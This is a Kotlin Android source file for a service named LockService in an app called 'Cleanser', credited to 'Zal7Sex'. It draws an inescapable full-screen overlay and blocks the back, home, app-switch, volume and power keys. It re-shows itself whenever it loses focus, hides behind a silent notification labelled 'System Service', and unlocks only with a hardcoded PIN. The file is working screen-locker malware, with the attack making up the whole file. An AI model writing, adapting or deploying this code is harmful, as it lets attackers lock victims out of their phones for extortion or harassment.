package com.cleanser.app

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.*
import android.os.*
import android.view.*
import android.view.WindowInsets
import android.view.WindowInsetsController
import android.widget.*
import androidx.core.app.NotificationCompat

class LockService : Service() {

    private val CHANNEL_ID = "cleanser_lock"
    private val NOTIF_ID   = 202
    private val handler    = Handler(Looper.getMainLooper())
    private val PIN        = "090510"

    private var wm: WindowManager? = null
    private var lockView: View?    = null
    private var isLocked           = false
    private var pinInput           = ""
    private var pinDotsRef: TextView? = null

    override fun onBind(intent: Intent?) = null

    override fun onCreate() {
        super.onCreate()
        createChannel()
        startForeground(NOTIF_ID, buildNotif())
        wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.getStringExtra("action") == "unlock") { doUnlock(); return START_NOT_STICKY }
        handler.post { showLock() }
        return START_STICKY
    }

    private fun showLock() {
        lockView?.let { try { wm?.removeViewImmediate(it) } catch (_: Exception) {} }
        lockView = null

        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1)
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        else @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE

        val lp = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_FULLSCREEN or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
            PixelFormat.OPAQUE
        ).apply {
            gravity = Gravity.TOP or Gravity.START
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P)
                layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
        }

        val view = buildLockView()
        lockView = view
        isLocked = true
        pinInput = ""

        try {
            wm!!.addView(view, lp)
            view.post { applyImmersive(view); view.requestFocus() }
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun loadDeltha(): Typeface? {
        return try {
            Typeface.createFromAsset(assets, "flutter_assets/assets/Deltha.ttf")
        } catch (_: Exception) { null }
    }

    private fun buildLockView(): FrameLayout {
        val dm      = resources.displayMetrics
        val density = dm.density
        val sw      = dm.widthPixels
        val sh      = dm.heightPixels

        val root = object : FrameLayout(this) {
            override fun dispatchKeyEvent(e: KeyEvent) = when (e.keyCode) {
                KeyEvent.KEYCODE_BACK, KeyEvent.KEYCODE_HOME, KeyEvent.KEYCODE_APP_SWITCH,
                KeyEvent.KEYCODE_MENU, KeyEvent.KEYCODE_VOLUME_UP, KeyEvent.KEYCODE_VOLUME_DOWN,
                KeyEvent.KEYCODE_POWER -> true
                else -> super.dispatchKeyEvent(e)
            }
            override fun onWindowFocusChanged(has: Boolean) {
                super.onWindowFocusChanged(has)
                if (!isLocked) return
                applyImmersive(this)
                if (!has) handler.postDelayed({ if (isLocked) showLock() }, 120)
            }
        }
        applyImmersive(root)
        root.setBackgroundColor(Color.BLACK)
        root.isClickable = true; root.isFocusable = true; root.isFocusableInTouchMode = true
        root.keepScreenOn = true

        val deltha = loadDeltha()

        val iconSz = (110 * density).toInt()
        root.addView(ImageView(this).apply { setImageBitmap(drawLockIcon(iconSz)) },
            FrameLayout.LayoutParams(iconSz, iconSz).apply {
                gravity = Gravity.TOP or Gravity.CENTER_HORIZONTAL
                topMargin = (sh * 0.15f).toInt()
            })

        val lockTextTop = (sh * 0.15f).toInt() + iconSz + (20 * density).toInt()

        root.addView(TextView(this).apply {
            text = "LOCK BY CLEANSER"
            textSize = 22f
            gravity = Gravity.CENTER
            setTextColor(Color.WHITE)
            letterSpacing = 0.12f
            typeface = deltha ?: Typeface.DEFAULT_BOLD
            setShadowLayer(16f, 0f, 0f, Color.parseColor("#FFFFFF55"))
        }, FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.WRAP_CONTENT).apply {
            gravity = Gravity.TOP or Gravity.CENTER_HORIZONTAL
            topMargin = lockTextTop
        })

        val devTextTop = lockTextTop + (48 * density).toInt()

        root.addView(TextView(this).apply {
            text = "Developer By Zal7Sex"
            textSize = 13f
            gravity = Gravity.CENTER
            setTextColor(Color.parseColor("#AAAAAA"))
            letterSpacing = 0.05f
            typeface = deltha ?: Typeface.DEFAULT
        }, FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.WRAP_CONTENT).apply {
            gravity = Gravity.TOP or Gravity.CENTER_HORIZONTAL
            topMargin = devTextTop
        })

        val pinDots = TextView(this).apply {
            text = buildDots()
            textSize = 28f
            gravity = Gravity.CENTER
            setTextColor(Color.parseColor("#EF4444"))
            typeface = Typeface.DEFAULT_BOLD
        }
        pinDotsRef = pinDots

        root.addView(pinDots, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.WRAP_CONTENT
        ).apply {
            gravity = Gravity.TOP or Gravity.CENTER_HORIZONTAL
            topMargin = (sh * 0.46f).toInt()
        })

        root.addView(buildNumpad(density), FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.WRAP_CONTENT, FrameLayout.LayoutParams.WRAP_CONTENT
        ).apply {
            gravity = Gravity.TOP or Gravity.CENTER_HORIZONTAL
            topMargin = (sh * 0.54f).toInt()
        })

        return root
    }

    private fun drawLockIcon(size: Int): Bitmap {
        val bmp   = Bitmap.createBitmap(size, size, Bitmap.Config.ARGB_8888)
        val c     = Canvas(bmp)
        val red   = Color.parseColor("#EF4444")
        val paint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
            color = red; style = Paint.Style.STROKE
            strokeWidth = size * 0.10f; strokeCap = Paint.Cap.ROUND
        }
        c.drawArc(RectF(size*.22f, size*.04f, size*.78f, size*.52f), 180f, 180f, false, paint)
        paint.style = Paint.Style.FILL; paint.strokeWidth = 0f
        c.drawRoundRect(RectF(size*.08f, size*.46f, size*.92f, size*.96f), size*.10f, size*.10f, paint)
        paint.color = Color.BLACK
        c.drawCircle(size*.5f, size*.68f, size*.10f, paint)
        c.drawRect(RectF(size*.44f, size*.68f, size*.56f, size*.85f), paint)
        return bmp
    }

    private fun buildNumpad(density: Float): LinearLayout {
        val rows = listOf(listOf("1","2","3"), listOf("4","5","6"), listOf("7","8","9"), listOf("⌫","0","✓"))
        val container = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; gravity = Gravity.CENTER }
        for (row in rows) {
            val rowView = LinearLayout(this).apply { orientation = LinearLayout.HORIZONTAL; gravity = Gravity.CENTER }
            for (digit in row) {
                val sz    = (70 * density).toInt()
                val m     = (7 * density).toInt()
                val color = when (digit) {
                    "✓" -> Color.parseColor("#10B981")
                    "⌫" -> Color.parseColor("#EF4444")
                    else -> Color.WHITE
                }
                rowView.addView(TextView(this).apply {
                    text = digit; textSize = 20f; gravity = Gravity.CENTER
                    setTextColor(color); typeface = Typeface.DEFAULT_BOLD
                    isClickable = true; isFocusable = true
                    background = buildCircleBg(sz, density)
                    setOnClickListener { handlePin(digit) }
                }, LinearLayout.LayoutParams(sz, sz).apply { setMargins(m,m,m,m) })
            }
            container.addView(rowView)
        }
        return container
    }

    private fun buildCircleBg(size: Int, density: Float): android.graphics.drawable.Drawable {
        val bmp = Bitmap.createBitmap(size, size, Bitmap.Config.ARGB_8888)
        val c   = Canvas(bmp)
        c.drawCircle(size/2f, size/2f, size/2f - 2f, Paint(Paint.ANTI_ALIAS_FLAG).apply {
            color = Color.parseColor("#1A0000"); style = Paint.Style.FILL
        })
        c.drawCircle(size/2f, size/2f, size/2f - 2f, Paint(Paint.ANTI_ALIAS_FLAG).apply {
            color = Color.parseColor("#EF444466"); style = Paint.Style.STROKE; strokeWidth = 1.5f * density
        })
        return android.graphics.drawable.BitmapDrawable(resources, bmp)
    }

    private fun handlePin(digit: String) {
        val dots = pinDotsRef ?: return
        when (digit) {
            "⌫" -> { if (pinInput.isNotEmpty()) pinInput = pinInput.dropLast(1) }
            "✓" -> {
                if (pinInput == PIN) { doUnlock(); stopSelf(); return }
                pinInput = ""
                dots.setTextColor(Color.parseColor("#FF2222"))
                handler.postDelayed({ dots.setTextColor(Color.parseColor("#EF4444")); dots.text = buildDots() }, 600)
            }
            else -> { if (pinInput.length < 6) pinInput += digit }
        }
        dots.text = buildDots()
    }

    private fun buildDots(): String {
        val f = "●".repeat(pinInput.length)
        val e = "○".repeat((6 - pinInput.length).coerceAtLeast(0))
        return "$f$e".chunked(1).joinToString("  ")
    }

    @Suppress("DEPRECATION")
    private fun applyImmersive(v: View) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                v.windowInsetsController?.let { c ->
                    c.hide(WindowInsets.Type.statusBars() or WindowInsets.Type.navigationBars() or WindowInsets.Type.systemBars())
                    c.systemBarsBehavior = WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
                }
            } catch (_: Exception) {}
        }
        v.systemUiVisibility = (View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
            or View.SYSTEM_UI_FLAG_FULLSCREEN or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
            or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or View.SYSTEM_UI_FLAG_LAYOUT_STABLE)
    }

    private fun doUnlock() {
        isLocked = false; pinInput = ""; pinDotsRef = null
        lockView?.let { try { wm?.removeViewImmediate(it) } catch (_: Exception) { try { wm?.removeView(it) } catch (_: Exception) {} } }
        lockView = null
        try {
            startActivity(Intent(this, MainActivity::class.java).apply {
                putExtra("action", "stop_screen_pinning")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP
            })
        } catch (_: Exception) {}
    }

    override fun onDestroy() { super.onDestroy(); doUnlock() }

    private fun buildNotif() = NotificationCompat.Builder(this, CHANNEL_ID)
        .setContentTitle("System Service").setContentText("")
        .setSmallIcon(android.R.drawable.ic_lock_lock)
        .setPriority(NotificationCompat.PRIORITY_MIN).setOngoing(true).setSilent(true)
        .setVisibility(NotificationCompat.VISIBILITY_SECRET).build()

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "System", NotificationManager.IMPORTANCE_NONE).apply {
                setShowBadge(false); lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            (getSystemService(NotificationManager::class.java)).createNotificationChannel(ch)
        }
    }
}
